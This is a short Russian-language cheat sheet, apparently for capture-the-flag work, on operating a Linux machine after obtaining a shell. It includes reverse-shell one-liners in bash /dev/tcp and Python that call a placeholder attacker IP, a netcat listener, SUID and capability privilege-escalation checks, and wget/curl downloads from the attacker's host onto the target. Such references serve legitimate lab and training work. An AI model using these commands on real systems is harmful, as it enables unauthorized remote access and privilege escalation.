# 09 — Выживание на Linux (быстрая шпаргалка)

На случай «дали шелл / надо быстро разобраться на машине / что-то не работает».

## Осмотреться
```bash
id; whoami; hostname; ip a           # кто я и где
sudo -l                              # что могу делать через sudo
ls -la; pwd                          # где я
cat /etc/os-release                  # что за система
ss -tlnp                             # открытые порты
```

## Найти флаг / файлы
```bash
find / -name 'flag*' 2>/dev/null
grep -rE '[A-Z0-9]{31}=' /var /home /tmp 2>/dev/null | head
locate flag 2>/dev/null
```

## Реверс-шелл (если нужно вернуть сессию)
```bash
# на своей машине слушаешь:
nc -lvnp 4444
# на цели:
bash -i >& /dev/tcp/ТВОЙ_IP/4444 0>&1
# варианты:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ТВОЙ_IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/bash","-i"])'
```

## Апгрейд «кривого» шелла до нормального
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z, затем:  stty raw -echo; fg  ,  затем:  export TERM=xterm
```

## Privesc — быстрые проверки
```bash
sudo -l                              # NOPASSWD команды = часто готовый root
find / -perm -4000 2>/dev/null       # SUID-бинарники
getcap -r / 2>/dev/null              # capabilities
# автоматом:
./linpeas.sh                         # если есть под рукой
```
> Подсказки по SUID/privesc: смотри GTFOBins (gtfobins.github.io).

## Передать файлы
```bash
# скачать на цель
wget http://ТВОЙ_IP:8000/file   ||  curl -O http://ТВОЙ_IP:8000/file
# поднять раздачу у себя
python3 -m http.server 8000
# между машинами по scp
scp file user@host:/tmp/
```

## Полезное
```bash
tmux                                 # не потерять сессию (detach: Ctrl-b d)
history                              # что делали до тебя
watch -n2 'ss -tnp'                  # следить за соединениями
```
